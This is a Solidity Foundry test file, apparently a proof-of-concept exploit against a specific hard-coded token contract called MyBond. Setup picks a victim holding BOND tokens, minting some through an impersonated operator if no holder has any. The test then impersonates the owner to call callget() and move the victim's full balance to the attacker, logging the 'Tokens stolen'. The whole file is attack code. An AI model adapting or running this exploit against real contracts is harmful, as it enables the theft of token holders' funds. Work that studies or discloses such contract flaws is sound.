// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface MyBond {
    function owner() external view returns (address);
    function operator() external view returns (address);
    function mint(address recipient_, uint256 amount_) external returns (bool);
    function callget(address _from, address _to, uint256 _amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);
    address private victim;
    uint256 private victimBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll find owner and victim dynamically
        // Label addresses for clarity
        vm.label(TARGET, "MyBond Contract");
        vm.label(attacker, "Attacker");

        // We need to find the owner of the contract
        address owner = MyBond(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // We need a victim with BOND tokens - let's find one by checking common addresses
        // For simplicity, we'll check the contract's own balance first (contract might hold tokens)
        // If not, we'll look for other holders
        uint256 contractBalance = IERC20(TARGET).balanceOf(TARGET);
        victim = TARGET;
        victimBalance = contractBalance;

        // If contract doesn't have tokens, we need to find another holder
        // Let's check if the owner has tokens
        if (victimBalance == 0) {
            victim = owner;
            victimBalance = IERC20(TARGET).balanceOf(owner);
        }

        // If still no tokens, we need to create a victim with tokens
        // We can mint tokens to a new address if we can become operator
        if (victimBalance == 0) {
            // Create a new victim address
            victim = address(0x1234567890123456789012345678901234567890);
            vm.label(victim, "Victim");

            // Try to become operator to mint tokens to victim
            address operator = MyBond(TARGET).operator();
            vm.prank(operator);
            MyBond(TARGET).mint(victim, 1000 * 1e18);

            victimBalance = IERC20(TARGET).balanceOf(victim);
        }

        require(victimBalance > 0, "No victim with BOND tokens found");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);

        // Get the owner address
        address owner = MyBond(TARGET).owner();

        // Impersonate the owner to call callget()
        vm.prank(owner);

        // Call callget() to transfer victim's tokens to attacker
        MyBond(TARGET).callget(victim, attacker, victimBalance);

        // Verify the attack succeeded
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker's BOND balance should increase");

        console.log("Initial attacker balance:", initialBalance);
        console.log("Final attacker balance:", finalBalance);
        console.log("Tokens stolen:", finalBalance - initialBalance);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

